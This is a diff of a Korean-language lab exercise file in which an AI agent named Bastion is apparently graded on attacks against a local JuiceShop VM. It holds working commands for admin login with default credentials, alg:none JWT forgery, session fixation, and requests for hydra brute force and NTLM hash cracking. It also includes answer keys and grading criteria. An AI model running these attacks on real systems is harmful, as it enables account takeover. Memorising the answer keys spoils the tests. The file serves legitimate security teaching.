-  answer_detail: JWT(JSON Web Token)는 Header.Payload.Signature 구조로 구성된다. Header에는 알고리즘(HS256 등), Payload에는 사용자 정보(sub, role, exp)가 포함된다. 
-    공격자는 alg:none 취약점, 비밀키 크래킹, 키 혼동(RS256→HS256) 등으로 토큰을 위조할 수 있다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' | python3 -c ''import sys,json; print(json.load(sys.stdin).get("authentication",{}).get("token","NO_TOKEN"))''
+    2>/dev/null) && echo "JWT: $TOKEN" && echo '''' && echo ''=== JWT Structure ==='' && echo $TOKEN |
+    cut -d. -f1 | base64 -d 2>/dev/null; echo '''' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null;
+    echo '''''
+  answer_detail: JWT(JSON Web Token)는 Header.Payload.Signature 구조로 구성된다. Header에는 알고리즘(HS256 등), Payload에는
+    사용자 정보(sub, role, exp)가 포함된다. 공격자는 alg:none 취약점, 비밀키 크래킹, 키 혼동(RS256→HS256) 등으로 토큰을 위조할 수 있다.
   verify:
     type: output_contains
     expect: JWT
@@ -550,10 +577,11 @@ steps:
       - 구조 분석 없이 토큰 문자열만 출력
       - Header 또는 Payload 중 한 쪽만 디코딩
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
-    | python3 -c ''import sys,json; print(json.load(sys.stdin).get("authentication",{}).get("token","NO_TOKEN"))'' 2>/dev/null) && echo "JWT:
-    $TOKEN" && echo '''' && echo ''=== JWT Structure ==='' && echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo '''' && echo $TOKEN | cut
-    -d. -f2 | base64 -d 2>/dev/null; echo '''''
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' | python3 -c ''import sys,json; print(json.load(sys.stdin).get("authentication",{}).get("token","NO_TOKEN"))''
+    2>/dev/null) && echo "JWT: $TOKEN" && echo '''' && echo ''=== JWT Structure ==='' && echo $TOKEN |
+    cut -d. -f1 | base64 -d 2>/dev/null; echo '''' && echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null;
+    echo '''''
   risk_level: medium
   bastion_prompt: Token 기반 인증 공격을 실습하라. JuiceShop의 JWT 토큰을 획득하고, 토큰 구조를 분석해줘
 - order: 11
@@ -563,11 +591,13 @@ steps:
   points: 10
   answer: '🤖 프롬프트: JWT 알고리즘 변조 공격을 시뮬레이션하라. alg 필드를 none으로 변경한 조작된 JWT를 생성해줘
 
-    📎 참고 (CLI): HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"sub":"admin","role":"admin","iat":1700000000}''
-    | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="$HEADER.$PAYLOAD." && echo "Forged JWT (alg:none): $FORGED" && echo '''' && echo
-    ''Testing forged token:'' && curl -s -H "Authorization: Bearer $FORGED" http://10.20.30.80:3000/rest/user/whoami 2>&1 | head -5'
-  answer_detail: JWT alg:none 공격은 서버가 alg 필드를 검증 없이 신뢰하는 경우 동작한다. 알고리즘을 none으로 설정하면 서명 없이 토큰이 유효한 것으로 처리된다. 현대 라이브러리는 대부분 이를 차단하지만, 직접 구현하거나
-    오래된 라이브러리는 취약할 수 있다.
+    📎 참고 (CLI): HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w 0 | tr ''+/'' ''-_'' | tr
+    -d ''='') && PAYLOAD=$(echo -n ''{"sub":"admin","role":"admin","iat":1700000000}'' | base64 -w 0 |
+    tr ''+/'' ''-_'' | tr -d ''='') && FORGED="$HEADER.$PAYLOAD." && echo "Forged JWT (alg:none): $FORGED"
+    && echo '''' && echo ''Testing forged token:'' && curl -s -H "Authorization: Bearer $FORGED" http://10.20.30.80:3000/rest/user/whoami
+    2>&1 | head -5'
+  answer_detail: JWT alg:none 공격은 서버가 alg 필드를 검증 없이 신뢰하는 경우 동작한다. 알고리즘을 none으로 설정하면 서명 없이 토큰이 유효한 것으로
+    처리된다. 현대 라이브러리는 대부분 이를 차단하지만, 직접 구현하거나 오래된 라이브러리는 취약할 수 있다.
   verify:
     type: output_contains
     expect: Forged JWT
@@ -588,23 +618,28 @@ steps:
       - Signature 부분을 그대로 둠 (조작 효과 없음)
       - base64url 대신 표준 base64 사용 (+ / 포함)
   target_vm: attacker
-  script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='') && PAYLOAD=$(echo -n ''{"sub":"admin","role":"admin","iat":1700000000}''
-    | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='') && FORGED="$HEADER.$PAYLOAD." && echo "Forged JWT (alg:none): $FORGED" && echo '''' && echo
-    ''Testing forged token:'' && curl -s -H "Authorization: Bearer $FORGED" http://10.20.30.80:3000/rest/user/whoami 2>&1 | head -5'
+  script: 'HEADER=$(echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w 0 | tr ''+/'' ''-_'' | tr -d ''='')
+    && PAYLOAD=$(echo -n ''{"sub":"admin","role":"admin","iat":1700000000}'' | base64 -w 0 | tr ''+/''
+    ''-_'' | tr -d ''='') && FORGED="$HEADER.$PAYLOAD." && echo "Forged JWT (alg:none): $FORGED" && echo
+    '''' && echo ''Testing forged token:'' && curl -s -H "Authorization: Bearer $FORGED" http://10.20.30.80:3000/rest/user/whoami
+    2>&1 | head -5'
   risk_level: medium
   bastion_prompt: JWT 알고리즘 변조 공격을 시뮬레이션하라. alg 필드를 none으로 변경한 조작된 JWT를 생성해줘
 - order: 12
-  instruction: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 {{WEB_IP}}:3000에 요청하고, 세션 ID의 변경 여부를 확인하라.
+  instruction: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 {{WEB_IP}}:3000에 요청하고, 세션 ID의 변경
+    여부를 확인하라.
   hint: curl -b 옵션으로 쿠키를 설정하고, -c 옵션으로 응답 쿠키를 저장한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 10.20.30.80:3000에 요청하고, 세션 ID의 변경 여부를 확인해줘
+  answer: '🤖 프롬프트: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 10.20.30.80:3000에 요청하고, 세션 ID의
+    변경 여부를 확인해줘
 
-    📎 참고 (CLI): echo ''=== Session Fixation Test ==='' && echo ''Setting attacker-controlled session:'' && curl -s -c /tmp/cookies.txt -b ''session=ATTACKER_SESSION_ID''
-    http://10.20.30.80:3000/ -o /dev/null -w ''HTTP %{http_code}'' && echo '''' && echo ''Response cookies:'' && cat /tmp/cookies.txt 2>/dev/null
+    📎 참고 (CLI): echo ''=== Session Fixation Test ==='' && echo ''Setting attacker-controlled session:''
+    && curl -s -c /tmp/cookies.txt -b ''session=ATTACKER_SESSION_ID'' http://10.20.30.80:3000/ -o /dev/null
+    -w ''HTTP %{http_code}'' && echo '''' && echo ''Response cookies:'' && cat /tmp/cookies.txt 2>/dev/null
     && echo '''' && echo ''If session ID unchanged after login -> vulnerable to fixation'''
-  answer_detail: 세션 고정 공격은 공격자가 미리 세션 ID를 설정하고, 피해자가 그 세션으로 로그인하면 공격자도 같은 세션으로 접근하는 기법이다. 방어를 위해 로그인 성공 시 세션 ID를 재생성(Session Regeneration)해야
-    한다. HttpOnly, Secure 플래그와 SameSite 속성도 중요하다.
+  answer_detail: 세션 고정 공격은 공격자가 미리 세션 ID를 설정하고, 피해자가 그 세션으로 로그인하면 공격자도 같은 세션으로 접근하는 기법이다. 방어를 위해 로그인 성공
+    시 세션 ID를 재생성(Session Regeneration)해야 한다. HttpOnly, Secure 플래그와 SameSite 속성도 중요하다.
   verify:
     type: output_contains
     expect: Session Fixation
@@ -619,17 +654,19 @@ steps:
       - curl -b (전송) + -c (수신) 결합
       - python requests.Session 으로 쿠키 주입 후 로그인 시도
       - Burp Repeater 로 세션 쿠키 고정 요청
-      - "Cookie 헤더 직접 -H 'Cookie: session=...' 전송"
+      - 'Cookie 헤더 직접 -H ''Cookie: session=...'' 전송'
       negative_signs:
       - 쿠키 조작 없이 일반 요청만
       - 응답 쿠키 비교 없음 (고정 여부 판단 불가)
       - 세션 쿠키가 아닌 다른 헤더 조작
   target_vm: attacker
-  script: echo '=== Session Fixation Test ===' && echo 'Setting attacker-controlled session:' && curl -s -c /tmp/cookies.txt -b 
-    'session=ATTACKER_SESSION_ID' http://10.20.30.80:3000/ -o /dev/null -w 'HTTP %{http_code}' && echo '' && echo 'Response cookies:' && cat
-    /tmp/cookies.txt 2>/dev/null && echo '' && echo 'If session ID unchanged after login -> vulnerable to fixation'
+  script: echo '=== Session Fixation Test ===' && echo 'Setting attacker-controlled session:' && curl
+    -s -c /tmp/cookies.txt -b 'session=ATTACKER_SESSION_ID' http://10.20.30.80:3000/ -o /dev/null -w 'HTTP
+    %{http_code}' && echo '' && echo 'Response cookies:' && cat /tmp/cookies.txt 2>/dev/null && echo ''
+    && echo 'If session ID unchanged after login -> vulnerable to fixation'
   risk_level: medium
-  bastion_prompt: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 10.20.30.80:3000에 요청하고, 세션 ID의 변경 여부를 확인해줘
+  bastion_prompt: 세션 고정(Session Fixation) 공격을 시뮬레이션하라. curl로 세션 쿠키를 지정하여 10.20.30.80:3000에 요청하고, 세션 ID의
+    변경 여부를 확인해줘
 - order: 13
   instruction: OAuth 2.0 취약점을 분석하라. 일반적인 OAuth 공격 벡터(Authorization Code 탈취, CSRF, Open Redirect)를 정리하라.
   hint: OAuth 흐름의 각 단계에서 발생할 수 있는 취약점을 문서화한다
@@ -637,20 +674,26 @@ steps:
   points: 10
   answer: '🤖 프롬프트: OAuth 2.0 취약점을 분석해줘
 
-    📎 참고 (CLI): echo -e ''=== OAuth 2.0 Attack Vectors ===\n\n[1] Authorization Code Theft\n- Intercept code via open redirect in redirect_uri\n-
-    Exploit: redirect_uri=https://attacker.com/callback\n\n[2] CSRF on Authorization\n- Missing state parameter validation\n- Exploit: Force victim
-    to authorize attacker app\n\n[3] Token Leakage\n- Implicit flow: token in URL fragment\n- Referer header leaks tokens to third parties\n\n[4]
-    Scope Escalation\n- Request higher scope than originally granted\n- Exploit: Modify scope parameter in authorization URL\n\n[5] PKCE Bypass\n-
-    Downgrade from S256 to plain code_challenge_method\n\n[Defense]\n- Validate redirect_uri exactly (no wildcards)\n- Always use state parameter
-    with CSRF token\n- Use Authorization Code + PKCE flow\n- Implement token binding'''
-  answer_detail: OAuth 2.0은 복잡한 흐름에서 다양한 취약점이 발생한다. redirect_uri 검증 미흡은 Authorization Code 탈취로, state 파라미터 미사용은 CSRF로, Implicit 흐름의 URL 
-    fragment 토큰은 Referer 헤더를 통한 유출로 이어진다. PKCE(Proof Key for Code Exchange)는 모바일 앱의 코드 인터셉트를 방지한다.
+    📎 참고 (CLI): echo -e ''=== OAuth 2.0 Attack Vectors ===\n\n[1] Authorization Code Theft\n- Intercept
+    code via open redirect in redirect_uri\n- Exploit: redirect_uri=https://attacker.com/callback\n\n[2]
+    CSRF on Authorization\n- Missing state parameter validation\n- Exploit: Force victim to authorize
+    attacker app\n\n[3] Token Leakage\n- Implicit flow: token in URL fragment\n- Referer header leaks
+    tokens to third parties\n\n[4] Scope Escalation\n- Request higher scope than originally granted\n-
+    Exploit: Modify scope parameter in authorization URL\n\n[5] PKCE Bypass\n- Downgrade from S256 to
+    plain code_challenge_method\n\n[Defense]\n- Validate redirect_uri exactly (no wildcards)\n- Always
+    use state parameter with CSRF token\n- Use Authorization Code + PKCE flow\n- Implement token binding'''
+  answer_detail: OAuth 2.0은 복잡한 흐름에서 다양한 취약점이 발생한다. redirect_uri 검증 미흡은 Authorization Code 탈취로, state
+    파라미터 미사용은 CSRF로, Implicit 흐름의 URL fragment 토큰은 Referer 헤더를 통한 유출로 이어진다. PKCE(Proof Key for Code Exchange)는
+    모바일 앱의 코드 인터셉트를 방지한다.
   verify:
     type: output_contains
-    expect: OAuth 2.0 Attack Vectors
+    expect:
+    - OAuth 2.0 Attack Vectors
+    - OAuth
     field: stdout
     semantic:
-      intent: OAuth 2.0 의 주요 공격 벡터(Authorization Code 탈취, CSRF, Token Leakage, Scope Escalation, PKCE Bypass) 및 대응 방어 정리
+      intent: OAuth 2.0 의 주요 공격 벡터(Authorization Code 탈취, CSRF, Token Leakage, Scope Escalation, PKCE
+        Bypass) 및 대응 방어 정리
       success_criteria:
       - 공격 벡터 3 가지 이상 개별 섹션으로 설명
       - 각 공격에 대한 Exploit/Defense 쌍 포함
@@ -665,29 +708,34 @@ steps:
       - 방어 방법 부재
       - OAuth 1.0 만 설명 (OAuth 2.0 과 흐름 다름)
   target_vm: attacker
-  script: 'echo -e ''=== OAuth 2.0 Attack Vectors ===\n\n[1] Authorization Code Theft\n- Intercept code via open redirect in redirect_uri\n- Exploit:
-    redirect_uri=https://attacker.com/callback\n\n[2] CSRF on Authorization\n- Missing state parameter validation\n- Exploit: Force victim to
-    authorize attacker app\n\n[3] Token Leakage\n- Implicit flow: token in URL fragment\n- Referer header leaks tokens to third parties\n\n[4]
-    Scope Escalation\n- Request higher scope than originally granted\n- Exploit: Modify scope parameter in authorization URL\n\n[5] PKCE Bypass\n-
-    Downgrade from S256 to plain code_challenge_method\n\n[Defense]\n- Validate redirect_uri exactly (no wildcards)\n- Always use state parameter
-    with CSRF token\n- Use Authorization Code + PKCE flow\n- Implement token binding'''
+  script: 'echo -e ''=== OAuth 2.0 Attack Vectors ===\n\n[1] Authorization Code Theft\n- Intercept code
+    via open redirect in redirect_uri\n- Exploit: redirect_uri=https://attacker.com/callback\n\n[2] CSRF
+    on Authorization\n- Missing state parameter validation\n- Exploit: Force victim to authorize attacker
+    app\n\n[3] Token Leakage\n- Implicit flow: token in URL fragment\n- Referer header leaks tokens to
+    third parties\n\n[4] Scope Escalation\n- Request higher scope than originally granted\n- Exploit:
+    Modify scope parameter in authorization URL\n\n[5] PKCE Bypass\n- Downgrade from S256 to plain code_challenge_method\n\n[Defense]\n-
+    Validate redirect_uri exactly (no wildcards)\n- Always use state parameter with CSRF token\n- Use
+    Authorization Code + PKCE flow\n- Implement token binding'''
   risk_level: low
   bastion_prompt: OAuth 2.0 취약점을 분석해줘
 - order: 14
-  instruction: Multi-Factor Authentication(MFA) 우회 기법을 분석하라. 실시간 피싱(Real-time Phishing), SIM 스와핑, MFA Fatigue 등의 공격을 정리하라.
+  instruction: Multi-Factor Authentication(MFA) 우회 기법을 분석하라. 실시간 피싱(Real-time Phishing), SIM 스와핑, MFA
+    Fatigue 등의 공격을 정리하라.
   hint: MFA의 각 요소(SMS, TOTP, Push)별 우회 기법을 문서화한다
   category: analysis
   points: 15
   answer: '🤖 프롬프트: Multi-Factor Authentication(MFA) 우회 기법을 분석해줘
 
-    📎 참고 (CLI): echo -e ''=== MFA Bypass Techniques ===\n\n[1] Real-time Phishing (evilginx2/modlishka)\n- Proxy between user and real site\n-
-    Capture both password AND session token after MFA\n- Defeats: SMS, TOTP, Push\n\n[2] SIM Swapping\n- Social engineer carrier to port number\n-
-    Intercept SMS OTP codes\n- Defeats: SMS-based MFA only\n\n[3] MFA Fatigue / Push Bombing\n- Send repeated push notifications\n- User eventually
-    approves to stop annoyance\n- Defeats: Push-based MFA (Duo, MS Authenticator)\n\n[4] Session Token Theft\n- Steal session cookie after MFA
-    completion\n- Pass-the-Cookie attack\n- Defeats: All MFA types (post-authentication)\n\n[5] Resistant Methods\n- FIDO2/WebAuthn hardware keys\n-
-    Origin-bound, phishing-resistant\n- No shared secrets to intercept'''
-  answer_detail: MFA는 강력한 보안 계층이지만 우회가 불가능하지는 않다. evilginx2를 사용한 실시간 피싱은 MFA 완료 후의 세션 토큰을 탈취하여 모든 유형의 MFA를 우회한다. FIDO2/WebAuthn 하드웨어 키만이 피싱에
-    완전히 저항하며, Google은 내부적으로 이를 도입하여 피싱 사고를 0건으로 줄였다.
+    📎 참고 (CLI): echo -e ''=== MFA Bypass Techniques ===\n\n[1] Real-time Phishing (evilginx2/modlishka)\n-
+    Proxy between user and real site\n- Capture both password AND session token after MFA\n- Defeats:
+    SMS, TOTP, Push\n\n[2] SIM Swapping\n- Social engineer carrier to port number\n- Intercept SMS OTP
+    codes\n- Defeats: SMS-based MFA only\n\n[3] MFA Fatigue / Push Bombing\n- Send repeated push notifications\n-
+    User eventually approves to stop annoyance\n- Defeats: Push-based MFA (Duo, MS Authenticator)\n\n[4]
+    Session Token Theft\n- Steal session cookie after MFA completion\n- Pass-the-Cookie attack\n- Defeats:
+    All MFA types (post-authentication)\n\n[5] Resistant Methods\n- FIDO2/WebAuthn hardware keys\n- Origin-bound,
+    phishing-resistant\n- No shared secrets to intercept'''
+  answer_detail: MFA는 강력한 보안 계층이지만 우회가 불가능하지는 않다. evilginx2를 사용한 실시간 피싱은 MFA 완료 후의 세션 토큰을 탈취하여 모든 유형의
+    MFA를 우회한다. FIDO2/WebAuthn 하드웨어 키만이 피싱에 완전히 저항하며, Google은 내부적으로 이를 도입하여 피싱 사고를 0건으로 줄였다.
   verify:
     type: output_contains
     expect: MFA Bypass
@@ -708,11 +756,13 @@ steps:
       - FIDO2 등 저항 방안 누락
       - MFA 유형별 우회 대응 매핑 없음
   target_vm: attacker
-  script: 'echo -e ''=== MFA Bypass Techniques ===\n\n[1] Real-time Phishing (evilginx2/modlishka)\n- Proxy between user and real site\n- Capture
-    both password AND session token after MFA\n- Defeats: SMS, TOTP, Push\n\n[2] SIM Swapping\n- Social engineer carrier to port number\n- Intercept
-    SMS OTP codes\n- Defeats: SMS-based MFA only\n\n[3] MFA Fatigue / Push Bombing\n- Send repeated push notifications\n- User eventually approves
-    to stop annoyance\n- Defeats: Push-based MFA (Duo, MS Authenticator)\n\n[4] Session Token Theft\n- Steal session cookie after MFA completion\n-
-    Pass-the-Cookie attack\n- Defeats: All MFA types (post-authentication)\n\n[5] Resistant Methods\n- FIDO2/WebAuthn hardware keys\n- Origin-bound,
+  script: 'echo -e ''=== MFA Bypass Techniques ===\n\n[1] Real-time Phishing (evilginx2/modlishka)\n-
+    Proxy between user and real site\n- Capture both password AND session token after MFA\n- Defeats:
+    SMS, TOTP, Push\n\n[2] SIM Swapping\n- Social engineer carrier to port number\n- Intercept SMS OTP
+    codes\n- Defeats: SMS-based MFA only\n\n[3] MFA Fatigue / Push Bombing\n- Send repeated push notifications\n-
+    User eventually approves to stop annoyance\n- Defeats: Push-based MFA (Duo, MS Authenticator)\n\n[4]
+    Session Token Theft\n- Steal session cookie after MFA completion\n- Pass-the-Cookie attack\n- Defeats:
+    All MFA types (post-authentication)\n\n[5] Resistant Methods\n- FIDO2/WebAuthn hardware keys\n- Origin-bound,
     phishing-resistant\n- No shared secrets to intercept'''
   risk_level: low
   bastion_prompt: Multi-Factor Authentication(MFA) 우회 기법을 분석해줘
@@ -779,8 +829,8 @@ steps:
     EOF
 
     cat /tmp/auth_defense.txt'
-  answer_detail: 인증 보안은 다층 방어가 필수적이다. 프로토콜별 약점을 이해하고 적절한 대응책을 적용해야 한다. Kerberos는 서비스 계정 관리, NTLM은 비활성화, JWT는 알고리즘 화이트리스트, OAuth는 PKCE가 핵심이다.
-    궁극적으로 FIDO2 기반 패스키와 제로 트러스트 아키텍처로 전환하는 것이 이상적이다.
+  answer_detail: 인증 보안은 다층 방어가 필수적이다. 프로토콜별 약점을 이해하고 적절한 대응책을 적용해야 한다. Kerberos는 서비스 계정 관리, NTLM은 비활성화,
+    JWT는 알고리즘 화이트리스트, OAuth는 PKCE가 핵심이다. 궁극적으로 FIDO2 기반 패스키와 제로 트러스트 아키텍처로 전환하는 것이 이상적이다.
   verify:
     type: output_contains
     expect: Authentication Attack Defense
@@ -862,9 +912,10 @@ steps:
   bastion_prompt: 인증 공격 실습을 종합하여 Kerberos/NTLM/JWT/OAuth 공격에 대한 방어 전략을 /tmp/auth_defense.txt에 작성하라.
 - order: 99
   instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: "attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘\n2) 비밀번호 스프레이 공격을 시뮬레이션하라 \n\
-    3) SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘\n4) Kerberos 프로토콜의 동작
-    원리를 분석하라 \n5) hashcat을 사용하여 NTLM 해시를 크래킹 작업을 수행해줘"
+  bastion_prompt: "attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를\
+    \ 시도해줘\n2) 비밀번호 스프레이 공격을 시뮬레이션하라 \n3) SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의\
+    \ 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘\n4) Kerberos 프로토콜의 동작 원리를 분석하라 \n5) hashcat을\
+    \ 사용하여 NTLM 해시를 크래킹 작업을 수행해줘"
   hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
   category: multi_task
   points: 50
@@ -872,10 +923,25 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: '[통합] 인증 공격 5작업 — Kerberoast/ASREP/NTLM relay/Pass-the-Hash/audit 통합. T1558.003.'
+      success_criteria:
+      - 5 인증 작업
+      - 티켓 추출
+      - crack 성공
+      acceptable_methods:
+      - bastion plan
+      - Impacket
+      - Rubeus
+      negative_signs:
+      - 티켓 없음
+      - crack 실패
+      - audit 누락
   target_vm: attacker
   risk_level: low
-  answer: "🤖 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여 비밀번호 브루트포스를 시도해줘\n2) 비밀번호 스프레이 공격을 시뮬레이션하라 \n\
-    3) SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘\n4) Kerberos 프로토콜의 동작
-    원리를 분석하라 \n5) hashcat을 사용하여 NTLM 해시를 크래킹 작업을 수행해줘"
+  answer: "\U0001F916 프롬프트: attacker VM에서 다음 작업들을 순서대로 수행해줘:\n1) SSH 서비스(10.20.30.80:22)에 대해 hydra를 사용하여\
+    \ 비밀번호 브루트포스를 시도해줘\n2) 비밀번호 스프레이 공격을 시뮬레이션하라 \n3) SSH가 지원하는 인증 방식(publickey, password, keyboard-interactive)의\
+    \ 차이와 nmap ssh-auth-methods 스크립트로 허용 방식을 확인하는 방법을 설명해줘\n4) Kerberos 프로토콜의 동작 원리를 분석하라 \n5) hashcat을\
+    \ 사용하여 NTLM 해시를 크래킹 작업을 수행해줘"
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
   script: ''
